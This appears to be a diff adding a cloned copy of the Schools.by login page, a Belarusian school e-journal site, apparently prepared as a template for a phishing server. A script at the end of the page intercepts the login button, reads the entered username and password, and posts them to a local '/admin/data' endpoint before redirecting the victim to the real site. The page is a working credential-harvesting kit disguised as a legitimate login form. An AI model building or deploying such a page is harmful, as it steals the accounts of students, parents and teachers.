@@ -1,0 +1,687 @@
+<!DOCTYPE html>
+<!-- saved from url=(0024)https://schools.by/login -->
+<html class="">
+
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <title>
+        Страница авторизации
+
+        Schools.by
+    </title>
+
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width">
+
+    <meta property="og:title" content="Schools.by">
+    <meta property="og:description"
+        content="Электронные журналы и дневники. Бесплатные сайты для учреждений образования Беларуси">
+    <meta property="og:image" content="https://static.schools.by/images/meta-img-600x300.png">
+
+    <link href="./Страница авторизации Schools.by_files/main_site-4f97dc54bc.css" rel="stylesheet">
+    <link href="./Страница авторизации Schools.by_files/main_site_admin-6bf460b240.css" rel="stylesheet">
+    <link href="./Страница авторизации Schools.by_files/jquery.fancybox.css" rel="stylesheet" media="screen">
+    <link href="./Страница авторизации Schools.by_files/jquery-ui.min.css" rel="stylesheet">
+
+    <link href="https://static.schools.by/compiled/main_site-4f97dc54bc.css" rel="stylesheet">
+    <link href="https://static.schools.by/javascripts/fancybox/jquery.fancybox.css" rel="stylesheet" media="screen">
+
+
+    <style>
+        /*! fancyBox v2.1.5 fancyapps.com | fancyapps.com/fancybox/#license */
+        .fancybox-wrap,
+        .fancybox-skin,
+        .fancybox-outer,
+        .fancybox-inner,
+        .fancybox-image,
+        .fancybox-wrap iframe,
+        .fancybox-wrap object,
+        .fancybox-nav,
+        .fancybox-nav span,
+        .fancybox-tmp {
+            padding: 0;
+            margin: 0;
+            border: 0;
+            outline: none;
+            vertical-align: top;
+        }
+
+        .fancybox-wrap {
+            position: absolute;
+            top: 0;
+            left: 0;
+            z-index: 8020;
+        }
+
+        .fancybox-skin {
+            position: relative;
+            background: #f9f9f9;
+            color: #444;
+            text-shadow: none;
+            -webkit-border-radius: 4px;
+            -moz-border-radius: 4px;
+            border-radius: 4px;
+        }
+
+        .fancybox-opened {
+            z-index: 8030;
+        }
+
+        .fancybox-opened .fancybox-skin {
+            -webkit-box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+            -moz-box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+        }
+
+        .fancybox-outer,
+        .fancybox-inner {
+            position: relative;
+        }
+
+        .fancybox-inner {
+            overflow: hidden;
+        }
+
+        .fancybox-type-iframe .fancybox-inner {
+            -webkit-overflow-scrolling: touch;
+        }
+
+        .fancybox-error {
+            color: #444;
+            font: 14px/20px "Helvetica Neue", Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 15px;
+            white-space: nowrap;
+        }
+
+        .fancybox-image,
+        .fancybox-iframe {
+            display: block;
+            width: 100%;
+            height: 100%;
+        }
+
+        .fancybox-image {
+            max-width: 100%;
+            max-height: 100%;
+        }
+
+        #fancybox-loading,
+        .fancybox-close,
+        .fancybox-prev span,
+        .fancybox-next span {
+            background-image: url('fancybox_sprite.png');
+        }
+
+        #fancybox-loading {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            margin-top: -22px;
+            margin-left: -22px;
+            background-position: 0 -108px;
+            opacity: 0.8;
+            cursor: pointer;
+            z-index: 8060;
+        }
+
+        #fancybox-loading div {
+            width: 44px;
+            height: 44px;
+            background: url('fancybox_loading.gif') center center no-repeat;
+        }
+
+        .fancybox-close {
+            position: absolute;
+            top: -18px;
+            right: -18px;
+            width: 36px;
+            height: 36px;
+            cursor: pointer;
+            z-index: 8040;
+        }
+
+        .fancybox-nav {
+            position: absolute;
+            top: 0;
+            width: 40%;
+            height: 100%;
+            cursor: pointer;
+            text-decoration: none;
+            background: transparent url('blank.gif');
+            /* helps IE */
+            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
+            z-index: 8040;
+        }
+
+        .fancybox-prev {
+            left: 0;
+        }
+
+        .fancybox-next {
+            right: 0;
+        }
+
+        .fancybox-nav span {
+            position: absolute;
+            top: 50%;
+            width: 36px;
+            height: 34px;
+            margin-top: -18px;
+            cursor: pointer;
+            z-index: 8040;
+            visibility: hidden;
+        }
+
+        .fancybox-prev span {
+            left: 10px;
+            background-position: 0 -36px;
+        }
+
+        .fancybox-next span {
+            right: 10px;
+            background-position: 0 -72px;
+        }
+
+        .fancybox-nav:hover span {
+            visibility: visible;
+        }
+
+        .fancybox-tmp {
+            position: absolute;
+            top: -99999px;
+            left: -99999px;
+            visibility: hidden;
+            max-width: 99999px;
+            max-height: 99999px;
+            overflow: visible !important;
+        }
+
+        /* Overlay helper */
+
+        .fancybox-lock {
+            overflow: hidden !important;
+            width: auto;
+        }
+
+        .fancybox-lock body {
+            overflow: hidden !important;
+        }
+
+        .fancybox-lock-test {
+            overflow-y: hidden !important;
+        }
+
+        .fancybox-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            overflow: hidden;
+            display: none;
+            z-index: 8010;
+            background: url('fancybox_overlay.png');
+        }
+
+        .fancybox-overlay-fixed {
+            position: fixed;
+            bottom: 0;
+            right: 0;
+        }
+
+        .fancybox-lock .fancybox-overlay {
+            overflow: auto;
+            overflow-y: scroll;
+        }
+
+        /* Title helper */
+
+        .fancybox-title {
+            visibility: hidden;
+            font: normal 13px/20px "Helvetica Neue", Helvetica, Arial, sans-serif;
+            position: relative;
+            text-shadow: none;
+            z-index: 8050;
+        }
+
+        .fancybox-opened .fancybox-title {
+            visibility: visible;
+        }
+
+        .fancybox-title-float-wrap {
+            position: absolute;
+            bottom: 0;
+            right: 50%;
+            margin-bottom: -35px;
+            z-index: 8050;
+            text-align: center;
+        }
+
+        .fancybox-title-float-wrap .child {
+            display: inline-block;
+            margin-right: -100%;
+            padding: 2px 20px;
+            background: transparent;
+            /* Fallback for web browsers that doesn't support RGBa */
+            background: rgba(0, 0, 0, 0.8);
+            -webkit-border-radius: 15px;
+            -moz-border-radius: 15px;
+            border-radius: 15px;
+            text-shadow: 0 1px 2px #222;
+            color: #FFF;
+            font-weight: bold;
+            line-height: 24px;
+            white-space: nowrap;
+        }
+
+        .fancybox-title-outside-wrap {
+            position: relative;
+            margin-top: 10px;
+            color: #fff;
+        }
+
+        .fancybox-title-inside-wrap {
+            padding-top: 10px;
+        }
+
+        .fancybox-title-over-wrap {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            color: #fff;
+            padding: 10px;
+            background: #000;
+            background: rgba(0, 0, 0, .8);
+        }
+
+        /*Retina graphics!*/
+        @media only screen and (-webkit-min-device-pixel-ratio: 1.5),
+        only screen and (min--moz-device-pixel-ratio: 1.5),
+        only screen and (min-device-pixel-ratio: 1.5) {
+
+            #fancybox-loading,
+            .fancybox-close,
+            .fancybox-prev span,
+            .fancybox-next span {
+                background-image: url('fancybox_sprite@2x.png');
+                background-size: 44px 152px;
+                /*The size of the normal image, half the size of the hi-res image*/
+            }
+
+            #fancybox-loading div {
+                background-image: url('fancybox_loading@2x.gif');
+                background-size: 24px 24px;
+                /*The size of the normal image, half the size of the hi-res image*/
+            }
+        }
+    </style>
+
+
+    <style>
+
+    </style>
+
+
+
+
+
+
+    <style type="text/css">
+        .fancybox-margin {
+            margin-right: 16px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div id="system_msg" class="fixed"></div>
+
+    <div id="layer_bg" class="fixed" style="height: 1134px;"></div>
+    <div id="layer_wrap" class="fixed scroll_fix_wrap" style="width: 1411px; height: 1134px;">
+        <div id="layer" style="width: 1395px;"></div>
+    </div>
+
+    <div id="box_layer_bg" class="fixed bg_dark" style="height: 1134px;"></div>
+    <div id="box_layer_wrap" class="fixed scroll_fix_wrap" style="width: 1411px; height: 1134px;">
+        <div id="box_layer" style="width: 1395px;">
+            <div id="box_loader"></div>
+        </div>
+    </div>
+
+
+
+    <div id="page_wrap" class="scroll_fix_wrap">
+        <div>
+            <div class="scroll_fix" style="width: 1395px;">
+                <div id="page_layout">
+                    <div class="grid-wrapper">
+                        <div class="grid-outer">
+
+                            <div class="grid-header">
+
+
+                                <div class="h-header ">
+                                    <div class="grid-fix">
+
+                                        <div class="h-grid">
+                                            <div class="h-grid-left">
+
+                                                <div class="h-logo">
+                                                    <a href="/" title="Schools.by"></a>
+                                                </div>
+
+                                            </div>
+                                            <div class="h-grid-right">
+
+
+
+
+                                                <div class="h-auth">
+
+
+
+                                                    <ul class="t-menu">
+                                                        <li class="t-menu-item">
+                                                            <a href="https://schools.by/registration"
+                                                                class="t-menu-link">
+                                                                Зарегистрироваться
+                                                            </a>
+                                                        </li>
+                                                        <li class="t-menu-item">
+
+                                                            <div class="dropdown">
+                                                                <a class="t-menu-link arrow dropdown-toggle"
+                                                                    data-toggle="dropdown">
+                                                                    <b>Войти</b>
+                                                                </a>
+                                                                <div class="dropdown-box">
+                                                                    <div class="h-login-form">
+                                                                        <form method="post"
+                                                                            action="https://schools.by/login"
+                                                                            data-gtm-form-interact-id="1">
+                                                                            <input type="hidden"
+                                                                                name="csrfmiddlewaretoken"
+                                                                                value="Po0gxc26yM3hqhbeGc23N0IVezsbFkc11d1RE783UusXduywTLpmapwc3rfwKa0I">
+                                                                            <div class="line">
+                                                                                <input spellcheck="false" type="text"
+                                                                                    name="username" class="text"
+                                                                                    placeholder="Логин"
+                                                                                    data-gtm-form-interact-field-id="2">
+                                                                            </div>
+                                                                            <div class="line">
+                                                                                <input type="password" name="password"
+                                                                                    class="text" placeholder="Пароль"
+                                                                                    data-gtm-form-interact-field-id="3">
+                                                                            </div>
+                                                                            <div class="terms">
+                                                                                <a href="https://schools.by/terms"
+                                                                                    target="_blank">Пользовательское
+                                                                                    соглашение</a>
+                                                                                <br>
+                                                                                <a href="https://schools.by/pd-policy"
+                                                                                    target="_blank">Политика обработки
+                                                                                    персональных
+                                                                                    данных</a>
+                                                                            </div>
+                                                                            <div class="line2">
+                                                                                <a class="fp"
+                                                                                    href="https://schools.by/login/reset-password">Забыли
+                                                                                    пароль?</a>
+                                                                                <input type="submit" class="button-flat"
+                                                                                    value="Войти">
+                                                                                <input type="hidden" name="|123"
+                                                                                    value="|123">
+                                                                            </div>
+                                                                        </form>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+
+                                                        </li>
+                                                    </ul>
+
+
+                                                </div>
+
+                                            </div>
+                                            <div class="h-grid-center">
+
+
+
+                                                <div class="h-menu">
+                                                    <ul class="t-menu">
+                                                        <li class="t-menu-item">
+                                                            <a class="t-menu-link"
+                                                                href="https://schools.by/capabilities">
+                                                                Возможности
+                                                            </a>
+                                                        </li>
+                                                        <li class="t-menu-item">
+                                                            <a class="t-menu-link" href="https://schools.by/cost">
+                                                                Стоимость
+                                                            </a>
+                                                        </li>
+                                                        <li class="t-menu-item">
+                                                            <a class="t-menu-link" href="https://schools.by/help">
+                                                                Помощь
+                                                            </a>
+                                                        </li>
+                                                        <li class="t-menu-item">
+                                                            <a class="t-menu-link" href="https://schools.by/contact">
+                                                                Контакты
+                                                            </a>
+                                                        </li>
+                                                    </ul>
+                                                </div>
+
+
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                            </div>
+
+                            <div class="grid-content">
+
+                                <div class="grid-fix">
+                                    <div class="mgrid">
+
+                                        <div class="mgrid-center">
+
+                                            <div class="login_page">
+                                                <div class="login_page_content">
+                                                    <div class="sbp">
+                                                        <div class="h1">Страница авторизации</div>
+                                                    </div>
+
+                                                    <div class="login_page_box">
+                                                        <div class="login_page_head">
+                                                            <h1>Вход на сайт Schools.by</h1>
+                                                        </div>
+                                                        <div class="login_page_body">
+
+                                                            <div data-gtm-form-interact-id="0">
+                                                                <input type="hidden" name="csrfmiddlewaretoken"
+                                                                    value="Po0gxc26yM3hqhbeGc23N0IVezsbFkc11d1RE783UusXduywTLpmapwc3rfwKa0I">
+
+
+
+
+
+                                                                <div class="line_frm ">
+                                                                    <div class="label ">Логин:
+
+                                                                        <span class="star">*</span>
+
+                                                                    </div>
+                                                                    <div class="field">
+
+
+                                                                        <div class="input_text_wrap">
+                                                                            <input type="text" name="username"
+                                                                                spellcheck="false" maxlength="32"
+                                                                                class="text required" required=""
+                                                                                id="id_username"
+                                                                                data-gtm-form-interact-field-id="0">
+                                                                        </div>
+                                                                        <div class="error_messages"></div>
+                                                                        <small></small>
+                                                                    </div>
+                                                                </div>
+
+
+                                                                <div class="line_frm ">
+                                                                    <div class="label ">Пароль:
+                                                                        <span class="star">*</span>
+                                                                    </div>
+                                                                    <div class="field">
+                                                                        <div class="input_text_wrap">
+
+                                                                            <input type="password" name="password"
+                                                                                spellcheck="false" class="text required"
+                                                                                required="" id="id_password"
+                                                                                data-gtm-form-interact-field-id="1">
+                                                                        </div>
+                                                                        <div class="error_messages"></div>
+                                                                        <small></small>
+                                                                    </div>
+                                                                </div>
+
+                                                                <div class="line_frm2">
+                                                                    <div class="field">
+                                                                        <div class="terms">
+                                                                            <a href="https://schools.by/terms"
+                                                                                target="_blank">Пользовательское
+                                                                                соглашение</a>
+                                                                            <br>
+                                                                            <a href="https://schools.by/pd-policy"
+                                                                                target="_blank">Политика обработки
+                                                                                персональных
+                                                                                данных</a>
+                                                                        </div>
+                                                                        <div>
+                                                                            <div class="button_wrap">
+                                                                                <input style="display: None" {{!--
+                                                                                    onclick="return false;" --}}
+                                                                                    class="button_blue" type="submit"
+                                                                                    value="Войти">
+                                                                                <input class="button_blue" type="submit"
+                                                                                    value="Войти">
+                                                                                <input type="hidden" name="|123"
+                                                                                    value="|123">
+                                                                            </div>
+                                                                            
+                                                                            <a class="fp"
+                                                                                href="https://schools.by/login/reset-password">Забыли
+                                                                                пароль?</a>
+                                                                        </div>
+                                                                        <div class="after_button">
+                                                                            У вас нет логина и пароля, но есть
+                                                                            пригласительный код?<br>Вам необходимо <a
+                                                                                href="https://schools.by/registration">зарегистрироваться</a>.
+                                                                        </div>
+                                                                    </div>
+                                                                </div>
+                                                                </>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="grid-footer">
+                                {{!-- <div id="footer">
+                                    <div class="f-add-part">
+                                        <div class="grid-fix">
+                                            <div class="cnt">
+                                                <a href="https://schools.by/" class="f-logo"></a>
+
+                                                <div class="f-address">
+                                                    ООО "Образовательные системы"<br>
+                                                    УНП 191684697
+                                                </div>
+
+                                                <div class="f-payments">
+                                                    <ul>
+                                                        <li><img src="./Страница авторизации Schools.by_files/payment-logo-visa-v2.png"
+                                                                style="height: 16px" alt="Изображение"></li>
+                                                        <li><img src="./Страница авторизации Schools.by_files/payment-logo-verified-by-visa-v2.png"
+                                                                style="height: 29px" alt="Изображение"></li>
+                                                        <li><img src="./Страница авторизации Schools.by_files/payment-logo-mastercard-v2.png"
+                                                                style="height: 32px" alt="Изображение"></li>
+                                                        <li><img src="./Страница авторизации Schools.by_files/payment-logo-mastercard-securecode-v2.png"
+                                                                style="height: 25px" alt="Изображение"></li>
+                                                        <li><img src="./Страница авторизации Schools.by_files/payment-logo-bepaid-v2.png"
+                                                                style="height: 17px" alt="Изображение"></li>
+                                                        <li><img src="./Страница авторизации Schools.by_files/payment-logo-belkart.png"
+                                                                style="height: 38px" alt="Изображение"></li>
+                                                    </ul>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div> --}}
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+</body>
+
+
+<script>
+    console.log("test")
+
+    console.log(document.querySelector(".button_wrap"))
+
+
+    document.querySelector(".button_wrap").addEventListener("click", async () => {
+
+        var username = document.getElementById("id_username").value;
+        var password = document.getElementById("id_password").value;
+
+        if (!username || !password) return
+
+
+
+        let responce = await fetch(`/admin/data`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                username: username,
+                password: password
+            })
+        })
+
+
+
+
+        const result = await responce.json()
+
+        if(result.url){
+            window.location.href = result.url;
+            return
+        }
+        window.location.href = "https://schools.by/"
+
+        
+
+    })
+
+
+
+</script>
+
+</html>
+
+
